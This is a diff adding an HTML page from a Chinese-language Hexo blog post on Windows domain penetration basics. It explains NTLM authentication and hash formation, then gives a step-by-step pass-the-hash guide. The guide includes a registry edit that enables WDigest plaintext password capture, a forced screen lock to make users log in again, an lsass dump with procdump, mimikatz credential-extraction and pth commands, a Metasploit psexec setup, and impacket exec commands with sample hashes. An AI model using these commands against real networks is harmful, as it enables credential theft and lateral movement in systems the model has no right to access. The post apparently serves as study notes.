@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>域渗透基础 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="域渗透基础 NTLM NTLM协议的认证过程分为三步：  1、协商：主要用于确认双方协议版本(NTLM v1&#x2F;NTLM V2)  2、质询：就是挑战（Challenge）&#x2F;响应（Response）认证机制起作用的范  3、验证：验证主要是在质询完成后，验证结果，是认证的最后 SSO: 单点登入 SAM数据库: windows本地认证登入, 存储本地账户信息 NTDS数据库: windows域中登入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透基础">
+<meta property="og:url" content="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="域渗透基础 NTLM NTLM协议的认证过程分为三步：  1、协商：主要用于确认双方协议版本(NTLM v1&#x2F;NTLM V2)  2、质询：就是挑战（Challenge）&#x2F;响应（Response）认证机制起作用的范  3、验证：验证主要是在质询完成后，验证结果，是认证的最后 SSO: 单点登入 SAM数据库: windows本地认证登入, 存储本地账户信息 NTDS数据库: windows域中登入">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-08-31T11:25:35.000Z">
+<meta property="article:modified_time" content="2021-08-31T11:26:05.643Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.0.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-域渗透基础" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" class="article-date">
+  <time datetime="2021-08-31T11:25:35.000Z" itemprop="datePublished">2021-08-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      域渗透基础
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>域渗透基础</p>
+<h2 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h2><p> NTLM协议的认证过程分为三步： </p>
+<p>1、协商：主要用于确认双方协议版本(NTLM v1/NTLM V2)</p>
+<p> 2、质询：就是挑战（Challenge）/响应（Response）认证机制起作用的范</p>
+<p> 3、验证：验证主要是在质询完成后，验证结果，是认证的最后</p>
+<p>SSO: 单点登入</p>
+<p>SAM数据库: windows本地认证登入, 存储本地账户信息</p>
+<p>NTDS数据库: windows域中登入, 存储域账户信息</p>
+<h5 id="NTLM生成过程"><a href="#NTLM生成过程" class="headerlink" title="NTLM生成过程"></a>NTLM生成过程</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTLM HASH产生：</span><br><span class="line">假设我的密码是admin，那么操作系统会将admin转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。</span><br><span class="line">admin(密码) </span><br><span class="line">-&gt; hex(16进制编码) &#x3D; 61646d696e</span><br><span class="line">-&gt; Unicode（Unicode编码） &#x3D; 610064006d0069006e00</span><br><span class="line">-&gt; MD4(MD4算法加密) &#x3D; 209c6174da490caeb422f3fa5a7ae634(NTLM Hash)</span><br></pre></td></tr></table></figure>
+
+<h4 id="ntlml-hash密码格式"><a href="#ntlml-hash密码格式" class="headerlink" title="ntlml hash密码格式:"></a>ntlml hash密码格式:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:683020925C5D8569C23AA724774CE6CC:::</span><br><span class="line">§ 用户名称为：Administrator</span><br><span class="line">§ SID为：500</span><br><span class="line">§ LM-HASH值为：C8825DB10F2590EAAAD3B435B51404EE</span><br><span class="line">§ NTLM-HASH值为：683020925C5D8569C23AA724774CE6CC</span><br><span class="line">LM Hash是 AAD3B435B51404EEAAD3B435B51404EE 这表示空密码或者是未使用LMHASH</span><br></pre></td></tr></table></figure>
+
+<h2 id="PASS-THE-HASH"><a href="#PASS-THE-HASH" class="headerlink" title="PASS THE HASH"></a>PASS THE HASH</h2><p>目的: 扩大战果, 打个比方 ==&gt; <code>比如说, 目标的域环境中有大量的域内主机, 渗透拿到其中一个目标的NTLM HASH, 用这个NTLM HASH登入其他主机, 登入成功则拿下另一台主机</code></p>
+<p>关于pth的补丁编号: kb2871997</p>
+<p>lsass.exe: 存放账户的NTLM HASH, 账户的明文信息, windows 10 或者 windows server&gt;=  2012, 有做策略无法直接拿到明文账户密码</p>
+<p>解决方法: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v </span><br><span class="line">UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f &#x2F;&#x2F;开启明文密码抓取</span><br><span class="line"></span><br><span class="line">强制锁屏: &#x2F;&#x2F;让用户重新登入, 才可以抓取明文密码</span><br><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>
+
+<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>看帮助信息: <code>::</code></p>
+<p>对当前的操作提权: <code>privilege::debug</code></p>
+<p>生成日志文件: <code>log</code>(记录所有信息)</p>
+<p>列出用户LM&amp;NTLM: <code>sekurlsa::msv</code></p>
+<p>列出用户的明文密码: <code>sekurlsa::wdigest</code></p>
+<p>列出kerberos凭据信息: <code>sekurlsa::kerberos</code></p>
+<p>列出所有的凭据信息: <code>sekurlsa::logonpasswords</code></p>
+<h5 id="mimikatz-procdump抓取密码"><a href="#mimikatz-procdump抓取密码" class="headerlink" title="mimikatz+procdump抓取密码"></a>mimikatz+procdump抓取密码</h5><p><code>procdump -accepteula -ma lsass.exe lsass</code></p>
+<p><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords&quot;</code> exit       ==&gt; 加exit执行完后可以主动退出</p>
+<h4 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h4><p>如果拿到域账户面密码, 可以登入到任意一台主机, 如果拿到了域控的账户密码,  直接登入远程主机的话可以拿到管理员权限</p>
+<p>mimikatz的方式: sekurlsa::pth /user:Administrator /ntlm:xxxx /domain:域名</p>
+<p>访问: dir \\ip\c$</p>
+<p>msf的方式: </p>
+<p>exploit/windows/smb/psexec</p>
+<p>&gt; set RHOSTS 192.168.1.139</p>
+<p>&gt; set SMBPASS LM_HASH:NTLM_HASH</p>
+<p>&gt; set domain 域名</p>
+<p>&gt; set SMBUSER Administrator</p>
+<p>imapcket工具包:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbexec.py -hashes</span><br><span class="line">9e1624ce1b75d58f4fa5418705880aa0:44dc684a10508cffcea721116f3226ce ilu.com&#x2F;Administrator@192.168.1.139</span><br><span class="line"></span><br><span class="line">wmiexec.py -hashes 9e1624ce1b75d58f4fa5418705880aa0:44dc684a10508cffcea721116f3226ce ilu.com&#x2F;Administrator@192.168.1.139</span><br><span class="line"></span><br><span class="line">psexec.py  -hashes 9e1624ce1b75d58f4fa5418705880aa0:44dc684a10508cffcea721116f3226ce ilu.com&#x2F;Administrator@192.168.1.139</span><br><span class="line"></span><br><span class="line">dcomexec.py  -hashes 9e1624ce1b75d58f4fa5418705880aa0:44dc684a10508cffcea721116f3226ce ilu.com&#x2F;Administrator@192.168.1.139</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" data-id="ckszzk0we000nnovj6lfr8k1l" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">端口转发和代理</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/">域渗透基础</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/">端口转发和代理</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/">empire会话传递和代理</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/">empire提权和持久化</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/18/empire%E5%9F%BA%E6%93%8D/">empire基操</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
